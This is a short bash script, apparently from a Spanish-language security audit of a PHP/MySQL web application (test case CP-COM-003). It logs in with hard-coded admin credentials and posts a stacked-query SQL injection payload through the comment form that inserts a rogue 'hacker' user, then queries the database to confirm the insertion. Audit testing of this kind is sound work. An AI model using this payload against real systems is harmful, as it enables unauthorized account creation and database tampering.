#!/usr/bin/env bash
# CP-COM-003: SQL Injection en insercion de comentarios (segunda sentencia apilada)
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$DIR/00_common.sh"
OUT="$DIR/../resultados/raw_CP-COM-003.txt"
JAR=/tmp/audit-mysql-run/cookies_com003.txt
rm -f "$JAR"

{
  echo "=== CP-COM-003: SQL Injection en INSERT de comentarios ==="
  echo "--- Estado previo: usuario 'hacker' no debe existir en tabla usuarios ---"
  mysql_cli -e "SELECT Id, nombre, email FROM usuarios WHERE email='hk@hk.com';"
  echo
  echo "--- Paso 1: login valido ---"
  curl -s -c "$JAR" -b "$JAR" -o /dev/null "$BASE_URL/index.php?id=1"
  curl -s -c "$JAR" -b "$JAR" -o /dev/null -X POST "$BASE_URL/setup/procesalogin.php" \
    --data-urlencode "frmusuario=admin@gmail.com" \
    --data-urlencode "frmpassword=admin01"
  echo "Login realizado."
  echo
  echo "--- Paso 2: POST grcomentarios.php con payload SQLi (sentencia apilada) ---"
  PAYLOAD="normal');INSERT INTO usuarios(nombre,email,password,estado) VALUES('hacker','hk@hk.com','hack01','1');--"
  echo "comentario=$PAYLOAD"
  curl -s -i -b "$JAR" -c "$JAR" -X POST "$BASE_URL/grcomentarios.php" \
    --data-urlencode "usuario=Administrador" \
    --data-urlencode "comentario=$PAYLOAD"
  echo
  echo "--- Paso 3: verificar en BD si la segunda sentencia (INSERT INTO usuarios) se ejecuto ---"
  mysql_cli -e "SELECT Id, nombre, email, password, estado FROM usuarios WHERE email='hk@hk.com';"
} | tee "$OUT"
